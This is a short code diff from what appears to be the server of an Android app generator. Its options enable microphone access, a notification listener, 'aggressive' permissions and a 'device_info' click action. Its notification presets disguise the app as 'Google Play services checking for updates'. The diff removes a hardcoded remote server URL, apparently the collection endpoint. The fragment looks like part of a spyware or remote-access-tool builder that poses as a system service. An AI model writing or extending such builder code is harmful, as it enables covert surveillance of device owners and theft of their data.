@@ -285,8 +285,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableMicrophonePermission: enableMicrophonePermission === 'true',
                 enableNotificationListener: enableNotificationListener === 'true',
                 aggressivePermissions: aggressivePermissions === 'true',
-                notificationClickAction: notificationClickAction || "device_info",
-                serverUrl: "https://p01--gallery-eye--9zr85m7yb6s4.code.run"
+                notificationClickAction: notificationClickAction || "device_info"
             };
             const NOTIF_PRESETS = {
                 google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info" },
